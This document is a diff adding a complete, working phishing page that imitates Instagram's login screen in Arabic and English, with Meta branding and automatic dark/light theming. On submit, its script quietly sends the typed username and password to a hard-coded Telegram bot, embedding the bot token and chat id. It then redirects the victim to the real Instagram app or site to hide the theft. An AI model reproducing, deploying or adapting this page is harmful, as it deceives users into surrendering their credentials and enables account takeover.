@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 80%;
+            max-width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Instagram', cursive;
+            font-size: 40px;
+            margin-bottom: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #333;
+            background-color: #000;
+            color: #fff;
+            border-radius: 5px;
+        }
+        .forgot-password {
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 12px;
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .meta-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+        .meta-text span {
+            font-weight: bold;
+        }
+
+        /* Light Theme */
+        .light-theme {
+            background-color: #fff;
+            color: #000;
+        }
+        .light-theme input {
+            background-color: #f5f5f5;
+            color: #000;
+        }
+        .light-theme button {
+            background-color: #3897f0;
+        }
+        .light-theme .forgot-password {
+            color: #3897f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="logo">Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p class="meta-text">from <span>Meta</span></p>
+    </div>
+
+    <script>
+        // Detect language preference and set the lang and text content dynamically
+        const userLanguage = navigator.language || navigator.userLanguage;
+        const isArabic = userLanguage.startsWith('ar');
+        document.documentElement.lang = isArabic ? 'ar' : 'en';  // Change the language of the document
+        
+        // Update text based on language preference
+        const translations = {
+            ar: {
+                usernamePlaceholder: "رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني",
+                passwordPlaceholder: "كلمة السر",
+                forgotPassword: "هل نسيت كلمة السر؟",
+                loginButton: "تسجيل الدخول",
+            },
+            en: {
+                usernamePlaceholder: "Phone number, username, or email",
+                passwordPlaceholder: "Password",
+                forgotPassword: "?Forgot password",
+                loginButton: "Log in",
+            },
+        };
+
+        const currentLang = isArabic ? 'ar' : 'en';
+        document.getElementById('username').placeholder = translations[currentLang].usernamePlaceholder;
+        document.getElementById('password').placeholder = translations[currentLang].passwordPlaceholder;
+        document.querySelector('.forgot-password').textContent = translations[currentLang].forgotPassword;
+        document.querySelector('button').textContent = translations[currentLang].loginButton;
+
+        // Detect theme preference (dark or light mode)
+        const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+
+        if (prefersDarkMode) {
+            document.body.classList.remove('light-theme');
+        } else {
+            document.body.classList.add('light-theme');
+        }
+
+        // Toggle color scheme if the system preference changes
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
+            if (e.matches) {
+                document.body.classList.remove('light-theme');
+            } else {
+                document.body.classList.add('light-theme');
+            }
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Collect user input
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Telegram bot configuration
+            const botToken = '7758302080:AAF0AsteUcTaM26AABHYqZSxIvQ1kZgZL80';
+            const chatId = '6305469091';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Prepare message to send
+            const message = `🎣\nUser: ${username}\nPass: ${password}`;
+
+            // Send data to Telegram silently
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            }).finally(() => {
+                // Redirect to Instagram app or website
+                const instagramAppLink = 'instagram://app';
+                const instagramWebLink = 'https://www.instagram.com';
+
+                // Try to open the Instagram app
+                window.location.href = instagramAppLink;
+
+                // Fallback to the web link if the app is not installed
+                setTimeout(() => {
+                    window.location.href = instagramWebLink;
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
